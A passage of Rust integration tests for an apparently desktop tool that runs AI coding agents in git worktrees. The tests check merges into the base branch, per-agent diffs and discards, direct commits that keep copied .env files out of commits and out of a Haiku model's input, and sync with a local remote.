    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["switch", "-qc", "other"]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err();
    let refused = err.downcast_ref::<NotOnBase>().expect("a typed refusal");
    assert_eq!(
        (refused.current.as_str(), refused.base.as_str()),
        ("other", "main")
    );
    assert_eq!(refused.wire(), "NOT_ON_BASE:other:main");
    // Neither the branch the project is on nor the agent's base got the agent's commits.
    assert_eq!(git(&r, &["branch", "--show-current"]), "other");
    assert_eq!(git(&r, &["rev-list", "--count", "other"]), "1");
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "1");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 1;\n"
    );
}

#[tokio::test]
async fn a_detached_head_is_not_the_base_either() {
    let h = harness("merge-detached");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["switch", "-q", "--detach"]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err();
    assert_eq!(
        err.downcast_ref::<NotOnBase>().unwrap().wire(),
        "NOT_ON_BASE::main"
    );
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "1");
}

#[tokio::test]
async fn merging_can_switch_the_project_to_the_base_first() {
    let h = harness("merge-switch");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["switch", "-qc", "other"]);
    h.core.merge_agent(&a.meta.id, true, true).await.unwrap();
    assert_eq!(git(&r, &["branch", "--show-current"]), "main");
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "2");
    assert_eq!(git(&r, &["log", "-1", "--format=%s", "main"]), "agent-1");
    // The squash lists the agent's commits, counted from the base.
    assert!(
        git(&r, &["log", "-1", "--format=%b", "main"]).contains("- agent change"),
        "{}",
        git(&r, &["log", "-1", "--format=%b", "main"])
    );
    assert_eq!(git(&r, &["rev-list", "--count", "other"]), "1");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
}

#[tokio::test]
async fn a_switch_git_refuses_is_reported_as_it_is_and_merges_nothing() {
    let h = harness("merge-switch-refused");
    let (p, r) = h.project(true).await;
    git(&r, &["branch", "other"]);
    // main has a file that `other` lacks.
    std::fs::write(r.join("only-on-main.txt"), "tracked\n").unwrap();
    git(&r, &["add", "only-on-main.txt"]);
    git(&r, &["commit", "-qm", "a file of main"]);
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    // On `other` the file is gone; the user's own, untracked, takes its place: switching to main
    // would overwrite it.
    git(&r, &["switch", "-q", "other"]);
    std::fs::write(r.join("only-on-main.txt"), "the user's\n").unwrap();
    let err = h
        .core
        .merge_agent(&a.meta.id, true, true)
        .await
        .unwrap_err();
    assert!(err.downcast_ref::<NotOnBase>().is_none());
    assert!(format!("{err:#}").contains("only-on-main.txt"), "{err:#}");
    assert_eq!(git(&r, &["branch", "--show-current"]), "other");
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "2");
    assert_eq!(
        std::fs::read_to_string(r.join("only-on-main.txt")).unwrap(),
        "the user's\n"
    );
}

#[tokio::test]
async fn a_base_branch_that_is_gone_is_said_and_nothing_is_merged() {
    let h = harness("merge-base-gone");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["branch", "-m", "main", "trunk"]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, true)
        .await
        .unwrap_err();
    assert!(err.downcast_ref::<NotOnBase>().is_none());
    assert!(
        err.to_string().contains("La branche de base « main »"),
        "{err:#}"
    );
    assert_eq!(git(&r, &["rev-list", "--count", "trunk"]), "1");
}

#[tokio::test]
async fn a_branch_the_folders_branch_already_holds_still_has_to_go_into_the_base() {
    let h = harness("merge-held-elsewhere");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    commit_change(Path::new(&wt.path), "const a = 2;\n", "agent change");
    // `other` got the agent's commit (counted from HEAD, nothing would be left to merge).
    git(&r, &["switch", "-qc", "other"]);
    git(&r, &["merge", "-q", "--ff-only", &wt.branch]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err();
    assert!(err.downcast_ref::<NotOnBase>().is_some(), "{err:#}");
}

#[tokio::test]
async fn what_there_is_to_merge_is_counted_from_the_base_not_from_head() {
    let h = harness("merge-count-from-base");
    let (p, r) = h.project(true).await;
    // A branch left behind at the first commit, which the project's folder then sits on.
    git(&r, &["branch", "behind"]);
    commit_change(&r, "const a = 2;\n", "main moves on");
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    git(&r, &["switch", "-q", "behind"]);
    // The agent has no commit of its own: HEAD lacks "main moves on", its base has it.
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err()
        .to_string();
    assert!(err.contains("Rien à merger"), "{err}");
    assert_eq!(git(&r, &["rev-list", "--count", "behind"]), "1");
}

#[tokio::test]
async fn the_git_log_shows_every_agent_branch_and_which_one_is_the_agents() {
    let h = harness("git-log");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    commit_change(Path::new(&wt.path), "const a = 2;\n", "agent change");

    let log = h
        .core
        .git_log(&p.id, Some(a.meta.id.clone()))
        .await
        .unwrap();
    assert_eq!(log.head.as_deref(), Some(wt.branch.as_str()));
    let c = log
        .commits
        .iter()
        .find(|c| c.subject == "agent change")
        .expect("agent commit listed");
    assert!(c.refs.contains(&wt.branch), "{:?}", c.refs);
    assert_eq!(
        h.core.git_log(&p.id, None).await.unwrap().head.as_deref(),
        Some("main")
    );

    let patch = h.core.git_show(&p.id, &c.hash).await.unwrap();
    assert!(patch.contains("+const a = 2;"), "{patch}");
}

#[tokio::test]
async fn a_file_is_discarded_and_read_in_the_checkout_that_holds_it() {
    let h = harness("core-git-discard");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    std::fs::write(wt.join("new.ts"), "x\n").unwrap();

    let id = Some(a.meta.id.clone());
    // Each row says which checkout it comes from.
    let mut rows: Vec<(String, Option<String>, bool)> = h
        .core
        .git_files(&p.id, None)
        .await
        .unwrap()
        .into_iter()
        .map(|f| (f.path, f.agent_id, f.in_worktree))
        .collect();
    rows.sort();
    assert_eq!(
        rows,
        vec![
            ("new.ts".into(), id.clone(), true),
            ("src/app.ts".into(), None, false),
            ("src/app.ts".into(), id.clone(), true),
        ]
    );
    // Each checkout is read where it is.
    let (root, _) = h.core.edit_root(&p.id, id.clone()).await.unwrap();
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 3;\n"));
    let (root, _) = h.core.edit_root(&p.id, None).await.unwrap();
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 2;\n"));

    h.core
        .git_discard(&p.id, id.clone(), "new.ts")
        .await
        .unwrap();
    h.core.git_discard(&p.id, id, "src/app.ts").await.unwrap();
    assert!(!wt.join("new.ts").exists());
    assert_eq!(
        std::fs::read_to_string(wt.join("src").join("app.ts")).unwrap(),
        "const a = 1;\n"
    );
    // The project's own checkout is untouched until discarded there.
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
    h.core.git_discard(&p.id, None, "src/app.ts").await.unwrap();
    assert_eq!(git(&r, &["status", "--porcelain"]), "");
}

#[tokio::test]
async fn the_project_diff_covers_the_checkout_and_each_agents_worktree() {
    let h = harness("core-project-diff");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    // The same file edited in both checkouts, and a file only the agent has.
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    std::fs::write(wt.join("new.ts"), "x\n").unwrap();

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    let owners: Vec<_> = parts
        .iter()
        .map(|d| (d.agent_id.clone(), d.in_worktree))
        .collect();
    let id = Some(a.meta.id.clone());
    assert_eq!(owners.len(), 2, "{owners:?}");
    assert!(owners.contains(&(None, false)), "{owners:?}");
    assert!(owners.contains(&(id.clone(), true)), "{owners:?}");

    let of = |agent: Option<String>| parts.iter().find(|d| d.agent_id == agent).unwrap();
    // The project's checkout shows its own edit only.
    let project_diff = &of(None).diff;
    assert!(project_diff.contains("+const a = 2;"), "{project_diff}");
    assert!(!project_diff.contains("+const a = 3;"), "{project_diff}");
    assert!(!project_diff.contains("new.ts"), "{project_diff}");
    // The agent's worktree shows both of its files, as the list does.
    let agent_diff = &of(id).diff;
    assert!(agent_diff.contains("+const a = 3;"), "{agent_diff}");
    assert!(agent_diff.contains("+++ b/new.ts"), "{agent_diff}");
    assert!(!agent_diff.contains("+const a = 2;"), "{agent_diff}");
}

#[tokio::test]
async fn the_project_diff_credits_checkout_files_to_the_agent_that_edited_them() {
    let h = harness("core-project-diff-owners");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "edit").await; // the fake reports src/app.ts as edited by the agent
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(r.join("notes.md"), "x\n").unwrap();

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    assert!(parts.iter().all(|d| !d.in_worktree));
    let of = |agent: Option<String>| parts.iter().find(|d| d.agent_id == agent).unwrap();
    let credited = &of(Some(id)).diff;
    assert!(credited.contains("+const a = 2;"), "{credited}");
    assert!(!credited.contains("notes.md"), "{credited}");
    let uncredited = &of(None).diff;
    assert!(uncredited.contains("+++ b/notes.md"), "{uncredited}");
    assert!(!uncredited.contains("src/app.ts"), "{uncredited}");
}

/// `n` new files with long names under `dir/generated`: listing all of them on one command line
/// overflows what Windows accepts (about 32,000 characters).
fn write_many_files(dir: &Path, n: usize) {
    let folder = dir.join("generated");
    std::fs::create_dir_all(&folder).unwrap();
    for i in 0..n {
        let name = format!("a-rather-long-generated-file-name-{i:04}.txt");
        std::fs::write(folder.join(name), "x\n").unwrap();
    }
}

#[tokio::test]
async fn the_project_diff_of_a_worktree_with_hundreds_of_new_files_keeps_its_edits() {
    let h = harness("core-project-diff-many-worktree");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    write_many_files(&wt, 800);

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    assert_eq!(parts.len(), 1);
    // The edit of a tracked file is still there, and so is the last of the new files.
    let diff = &parts[0].diff;
    assert!(
        diff.contains("+const a = 3;"),
        "{}",
        &diff[..diff.len().min(300)]
    );
    assert!(diff.contains("a-rather-long-generated-file-name-0799.txt"));
}

#[tokio::test]
async fn the_project_diff_of_a_checkout_split_between_owners_keeps_the_edits_among_hundreds_of_new_files(
) {
    let h = harness("core-project-diff-many-checkout");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("lib.ts"), "export {};\n").unwrap();
    git(&r, &["add", "lib.ts"]);
    git(&r, &["commit", "-qm", "lib"]);
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "edit").await; // the fake reports src/app.ts as edited by the agent
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(r.join("lib.ts"), "export const b = 1;\n").unwrap();
    write_many_files(&r, 800);

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    let of = |agent: Option<String>| parts.iter().find(|d| d.agent_id == agent).unwrap();
    let credited = &of(Some(id)).diff;
    assert!(credited.contains("+const a = 2;"), "{credited}");
    assert!(!credited.contains("lib.ts"));
    // No agent edited lib.ts or the new files: they share one part, hundreds of paths long.
    let rest = &of(None).diff;
    assert!(
        rest.contains("+export const b = 1;"),
        "{}",
        &rest[..rest.len().min(300)]
    );
    assert!(rest.contains("a-rather-long-generated-file-name-0799.txt"));
    assert!(!rest.contains("src/app.ts"));
}

#[tokio::test]
async fn the_project_diff_says_why_an_agents_worktree_could_not_be_read() {
    let h = harness("core-project-diff-unreadable");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(wt.join("new.ts"), "x\n").unwrap();
    let id = a.meta.id.clone();
    let diff = h.core.worktree_diff(Some(&id)).await.unwrap().unwrap();
    assert!(diff.contains("+++ b/new.ts"), "{diff}");
    // Listed, then broken before its diff is read: its files are not left out without a word.
    std::fs::write(wt.join(".git"), "gitdir: nowhere\n").unwrap();
    let e = h.core.worktree_diff(Some(&id)).await.unwrap_err();
    let said = format!("{e:#}");
    let name = h.core.agent(&id).unwrap().lock().meta.name.clone();
    assert!(
        said.starts_with(&format!("Diff du worktree de « {name} » non lu : ")),
        "{said}"
    );
    // An agent deleted since the list was made has nothing left to show, nor one whose worktree
    // folder went in the meantime (a validation, an archive).
    assert_eq!(h.core.worktree_diff(Some("gone")).await.unwrap(), None);
    h.wait("warm-up", |h| h.alive(&id)).await;
    if let Some(proc) = h.core.agent(&id).unwrap().lock().detach() {
        proc.kill();
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    std::fs::remove_dir_all(&wt).unwrap();
    assert_eq!(h.core.worktree_diff(Some(&id)).await.unwrap(), None);
}

#[tokio::test]
async fn the_project_diff_is_empty_when_nothing_is_listed() {
    let h = harness("core-project-diff-clean");
    let (p, _r) = h.project(true).await;
    h.core.create_agent(&p.id, None).await.unwrap();
    assert!(h.core.git_project_diff(&p.id).await.unwrap().is_empty());
}

// ---------- direct commit ----------

fn paths_of(scope: &CommitScope) -> Vec<String> {
    let mut paths: Vec<String> = scope.files.iter().map(|f| f.path.clone()).collect();
    paths.sort();
    paths
}

fn strings(list: &[&str]) -> Vec<String> {
    list.iter().map(|s| s.to_string()).collect()
}

#[tokio::test]
async fn a_direct_commit_of_an_agent_takes_its_own_files_and_nothing_else() {
    let h = harness("commit-direct-agent");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.agent(&id).unwrap().lock().meta.touched_files = strings(&["src/app.ts", "src/b.ts"]);
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(r.join("src").join("b.ts"), "const b = 1;\n").unwrap();
    // Not the agent's: left out, even when asked for.
    std::fs::write(r.join("notes.md"), "x\n").unwrap();
    let scope = h
        .core
        .commit_preview(&p.id, Some(id.clone()))
        .await
        .unwrap();
    assert_eq!(paths_of(&scope), ["src/app.ts", "src/b.ts"]);
    assert!(scope.left_out.is_empty());
    let hash = h
        .core
        .commit_direct(
            &p.id,
            Some(id.clone()),
            strings(&["src/app.ts", "src/b.ts", "notes.md"]),
            "feat(api): les fichiers de l'agent\n\nRelu par moi.".into(),
        )
        .await
        .unwrap();
    assert_eq!(hash, git(&r, &["rev-parse", "--short", "HEAD"]));
    assert_eq!(
        git(&r, &["log", "-1", "--format=%B"]),
        "feat(api): les fichiers de l'agent\n\nRelu par moi."
    );
    assert_eq!(
        git(&r, &["show", "--name-only", "--format=", "HEAD"]),
        "src/app.ts\nsrc/b.ts"
    );
    assert_eq!(git(&r, &["status", "--porcelain"]), "?? notes.md");
}

#[tokio::test]
async fn a_direct_commit_of_the_project_leaves_the_agents_worktrees_alone() {
    let h = harness("commit-direct-project");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    let scope = h.core.commit_preview(&p.id, None).await.unwrap();
    assert_eq!(paths_of(&scope), ["src/app.ts"]);
    assert!(scope.files.iter().all(|f| !f.in_worktree));
    h.core
        .commit_direct(&p.id, None, paths_of(&scope), "fix: le projet".into())
        .await
        .unwrap();
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "fix: le projet");
    assert_eq!(git(&r, &["status", "--porcelain"]), "");
    // The agent's worktree is committed from its own scope only.
    assert_eq!(git(&wt, &["status", "--porcelain"]), "M src/app.ts");
    let scope = h
        .core
        .commit_preview(&p.id, Some(a.meta.id.clone()))
        .await
        .unwrap();
    h.core
        .commit_direct(
            &p.id,
            Some(a.meta.id),
            paths_of(&scope),
            "feat: l'agent".into(),
        )
        .await
        .unwrap();
    assert_eq!(git(&wt, &["log", "-1", "--format=%s"]), "feat: l'agent");
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "fix: le projet");
}

#[tokio::test]
async fn a_direct_commit_never_takes_nor_shows_haiku_the_files_copied_into_the_worktree() {
    let h = harness("commit-direct-env");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    let id = Some(a.meta.id.clone());
    // The agent's own example file is committed; the copied one it forced into the index is not.
    std::fs::write(wt.join(".env.example"), "SECRET=\n").unwrap();
    git(&wt, &["add", "-f", ".env"]);
    std::fs::write(wt.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let scope = h.core.commit_preview(&p.id, id.clone()).await.unwrap();
    assert_eq!(paths_of(&scope), [".env.example", "src/app.ts"]);
    assert_eq!(scope.left_out, [".env"]);
    // Even asked for (an older list), it stays out of the proposal's diff and of the commit.
    let asked = strings(&[".env", ".env.example", "src/app.ts"]);
    let proposal = h
        .core
        .commit_propose(&p.id, id.clone(), asked.clone())
        .await
        .unwrap();
    // Nor does Haiku read the example: no file matching the copy's patterns goes into its diff.
    assert!(proposal.contains("Diff de : src/app.ts."), "{proposal}");
    h.core
        .commit_direct(&p.id, id, asked, "feat: l'exemple".into())
        .await
        .unwrap();
    assert_eq!(
        git(&wt, &["ls-tree", "-r", "--name-only", "HEAD"]),
        ".env.example\nsrc/app.ts"
    );
    assert_eq!(
        std::fs::read_to_string(wt.join(".env")).unwrap(),
        "SECRET=1\n"
    );
}

/// The project's repository `r` with a committed `.gitignore` that ignores `.env`, and a `.env`.
fn committed_gitignore(r: &Path) {
    std::fs::write(r.join(".gitignore"), ".env\n").unwrap();
    git(r, &["add", ".gitignore"]);
    git(r, &["commit", "-qm", "ignore .env"]);
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
}

#[tokio::test]
async fn a_copied_env_stays_out_even_once_the_agent_no_longer_ignores_it_in_its_worktree() {
    let h = harness("commit-direct-env-unignored");
    let (p, r) = h.project(true).await;
    committed_gitignore(&r);
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    assert_eq!(
        std::fs::read_to_string(wt.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    // The agent's own rules no longer ignore it: git now lists it as a new file.
    std::fs::write(wt.join(".gitignore"), "").unwrap();
    assert!(git(&wt, &["status", "--porcelain"]).contains("?? .env"));
    let id = Some(a.meta.id.clone());
    let scope = h.core.commit_preview(&p.id, id.clone()).await.unwrap();
    assert_eq!(paths_of(&scope), [".gitignore"]);
    assert_eq!(scope.left_out, [".env"]);
    let asked = strings(&[".env", ".gitignore"]);
    let proposal = h
        .core
        .commit_propose(&p.id, id.clone(), asked.clone())
        .await
        .unwrap();
    assert!(proposal.contains("Diff de : .gitignore."), "{proposal}");
    h.core
        .commit_direct(&p.id, id, asked, "chore: les règles".into())
        .await
        .unwrap();
    assert_eq!(
        git(&wt, &["ls-tree", "-r", "--name-only", "HEAD"]),
        ".gitignore\nsrc/app.ts"
    );
}

#[tokio::test]
async fn haiku_never_reads_a_file_matching_the_copy_patterns() {
    let h = harness("commit-propose-env-unread");
    let (p, r) = h.project(false).await;
    committed_gitignore(&r);
    // The project's own rules no longer ignore it: it is listed, for the user to see, but its
    // content is never sent.
    std::fs::write(r.join(".gitignore"), "").unwrap();
    let scope = h.core.commit_preview(&p.id, None).await.unwrap();
    assert_eq!(paths_of(&scope), [".env", ".gitignore"]);
    let proposal = h
        .core
        .commit_propose(&p.id, None, paths_of(&scope))
        .await
        .unwrap();
    assert!(proposal.contains("Diff de : .gitignore."), "{proposal}");
    // Asked for it alone: no diff at all, never the whole checkout's.
    let proposal = h
        .core
        .commit_propose(&p.id, None, strings(&[".env"]))
        .await
        .unwrap();
    assert!(proposal.ends_with("Diff de : ."), "{proposal}");
}

#[tokio::test]
async fn a_direct_commit_and_its_proposal_hold_off_a_restart_while_they_run() {
    let h = harness("commit-direct-working");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let paths = strings(&["src/app.ts"]);
    // What runs alongside sees the work under way, and none once it is over.
    async fn seen_working(h: &Harness, run: impl std::future::Future<Output = ()>) -> bool {
        let done = AtomicBool::new(false);
        let watch = async {
            let mut seen = false;
            while !done.load(Ordering::Acquire) {
                seen |= h.core.works.load(Ordering::Acquire) > 0;
                tokio::time::sleep(Duration::from_millis(1)).await;
            }
            seen
        };
        let run = async {
            run.await;
            done.store(true, Ordering::Release);
        };
        tokio::join!(watch, run).0
    }
    let core = h.core.clone();
    let (pid, asked) = (p.id.clone(), paths.clone());
    let proposing = seen_working(&h, async move {
        core.commit_propose(&pid, None, asked).await.unwrap();
    })
    .await;
    assert!(proposing, "the proposal was never seen under way");
    assert_eq!(h.core.works.load(Ordering::Acquire), 0);
    let core = h.core.clone();
    let committing = seen_working(&h, async move {
        core.commit_direct(&p.id, None, paths, "fix: x".into())
            .await
            .unwrap();
    })
    .await;
    assert!(committing, "the commit was never seen under way");
    assert_eq!(h.core.works.load(Ordering::Acquire), 0);
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "fix: x");
}

#[tokio::test]
async fn a_commit_proposal_follows_the_latest_subjects_of_the_repository() {
    let h = harness("commit-propose-style");
    let (p, r) = h.project(false).await;
    for (file, subject) in [
        ("a.txt", "feat(api): un premier"),
        ("b.txt", "fix(api): un second"),
    ] {
        std::fs::write(r.join(file), "x\n").unwrap();
        git(&r, &["add", file]);
        git(&r, &["commit", "-qm", subject]);
    }
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let proposal = h
        .core
        .commit_propose(&p.id, None, strings(&["src/app.ts"]))
        .await
        .unwrap();
    assert!(
        proposal.contains("D'après « fix(api): un second »"),
        "{proposal}"
    );
    assert!(proposal.contains("Diff de : src/app.ts."), "{proposal}");
    // Proposed only: nothing is committed.
    assert_eq!(
        git(&r, &["log", "-1", "--format=%s"]),
        "fix(api): un second"
    );
}

#[tokio::test]
async fn without_claude_code_there_is_no_proposal_and_its_reason_is_given() {
    let h = harness("commit-propose-no-claude");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    h.core.settings.write().claude_path = h.dir.join("absent.cmd").to_string_lossy().to_string();
    let e = h
        .core
        .commit_propose(&p.id, None, strings(&["src/app.ts"]))
        .await
        .unwrap_err();
    assert_eq!(format!("{e:#}"), "claude introuvable");
}

#[tokio::test]
async fn a_direct_commit_needs_a_message_and_something_to_commit() {
    let h = harness("commit-direct-refused");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let e = h
        .core
        .commit_direct(&p.id, None, strings(&["src/app.ts"]), " \n ".into())
        .await
        .unwrap_err();
    assert_eq!(format!("{e:#}"), "Écris le message du commit.");
    let e = h
        .core
        .commit_direct(&p.id, None, strings(&["absent.ts"]), "fix: x".into())
        .await
        .unwrap_err();
    assert_eq!(
        format!("{e:#}"),
        "Plus rien à commiter : ces fichiers n'ont plus de modification."
    );
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "init");
    // Git's own refusal comes back as it is (a hook that says no).
    let hooks = r.join(".git").join("hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    let hook = hooks.join("pre-commit");
    std::fs::write(&hook, "#!/bin/sh\necho 'lint en échec' >&2\nexit 1\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let e = h
        .core
        .commit_direct(&p.id, None, strings(&["src/app.ts"]), "fix: x".into())
        .await
        .unwrap_err();
    assert!(format!("{e:#}").contains("lint en échec"), "{e:#}");
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "init");
}

#[tokio::test]
async fn git_counts_attribute_files_to_the_agent_that_edited_them() {
    let h = harness("git-counts");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "edit").await; // the fake edits src/app.ts (reported only; write it for git)
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\nconst b = 3;\n").unwrap();
    std::fs::write(r.join("notes.md"), "x\n").unwrap();
    h.core.compute_git(&p.id).await;
    let info = h.core.git_cache.read().get(&p.id).cloned().unwrap();
    assert_eq!((info.modified, info.added, info.total), (1, 1, 2));
    assert_eq!(info.agents.get(&id), Some(&1));
    let files = h.core.git_files(&p.id, Some(id.clone())).await.unwrap();
    assert_eq!(
        files
            .iter()
            .map(|f| (f.path.as_str(), f.add, f.del))
            .collect::<Vec<_>>(),
        vec![("src/app.ts", 2, 1)]
    );
}

/// Gives the project's repository `r` a bare remote (origin, tracked by main) and returns a
/// second clone of it, to push commits the project does not have yet.
fn add_remote(dir: &Path, r: &Path) -> PathBuf {
    let bare = dir.join("remote.git").to_string_lossy().to_string();
    git(dir, &["init", "-q", "--bare", "-b", "main", &bare]);
    git(r, &["remote", "add", "origin", &bare]);
    git(r, &["push", "-qu", "origin", "main"]);
    let other = dir.join("other");
    git(dir, &["clone", "-q", &bare, &other.to_string_lossy()]);
    git(&other, &["config", "core.autocrlf", "false"]);
    other
}

fn git_info(h: &Harness, project_id: &str) -> GitInfo {
    h.core.git_cache.read().get(project_id).cloned().unwrap()
}

#[tokio::test]
async fn git_state_tells_how_the_branch_stands_against_its_remote() {
    let h = harness("git-sync-state");
    let (p, r) = h.project(false).await;
    // Without a remote: nothing fetched, nothing to sync.
    h.core.fetch_all().await;
    h.core.compute_git(&p.id).await;
    let info = git_info(&h, &p.id);
    assert!(!info.has_remote);
    assert_eq!((info.upstream, info.last_fetch), (None, None));

    let other = add_remote(&h.dir, &r);
    commit_change(&other, "const a = 2;\n", "theirs");
    git(&other, &["push", "-q"]);
    commit_change(&r, "const a = 3;\n", "mine");
    h.core.fetch_all().await;
    h.core.compute_git(&p.id).await;
    let info = git_info(&h, &p.id);
    assert!(info.has_remote);
    assert_eq!(info.upstream.as_deref(), Some("origin/main"));
    assert_eq!((info.ahead, info.behind), (1, 1));
    assert!(info.last_fetch.is_some());
    let sent = h
        .events
        .lock()
        .iter()
        .rev()
        .find(|e| e["type"] == "git")
        .cloned()
        .unwrap();
    assert_eq!(sent["git"]["hasRemote"], true);
    assert_eq!(sent["git"]["upstreamGone"], false);
    assert_eq!(sent["git"]["upstream"], "origin/main");
    assert_eq!(
        (sent["git"]["ahead"].clone(), sent["git"]["behind"].clone()),
        (1.into(), 1.into())
    );
    assert!(sent["git"]["lastFetch"].is_i64());
}

#[tokio::test]
async fn fetch_pull_and_push_act_on_the_projects_checkout() {
    let h = harness("git-sync-actions");
    let (p, r) = h.project(false).await;
    let other = add_remote(&h.dir, &r);
    commit_change(&other, "const a = 2;\n", "theirs");
    git(&other, &["push", "-q"]);
    assert_eq!(
        h.core.git_sync(&p.id, SyncOp::Fetch).await.unwrap(),
        "Fetch terminé : 1 commit à tirer"
    );
    assert_eq!(
        h.core.git_sync(&p.id, SyncOp::Pull).await.unwrap(),
        "1 commit tiré"
    );
    commit_change(&r, "const a = 3;\n", "mine");
    assert_eq!(
        h.core.git_sync(&p.id, SyncOp::Push).await.unwrap(),
        "1 commit poussé"
    );
    h.core.compute_git(&p.id).await;
    let info = git_info(&h, &p.id);
    assert_eq!((info.ahead, info.behind), (0, 0));
    assert_eq!(git(&other, &["pull", "-q"]), "");
    assert_eq!(
        std::fs::read_to_string(other.join("src").join("app.ts")).unwrap(),
        "const a = 3;\n"
    );
}

#[tokio::test]
async fn streaming_deltas_reach_the_ui_batched_and_in_order() {
    let h = harness("batch");
    let (p, _) = h.project(false).await;
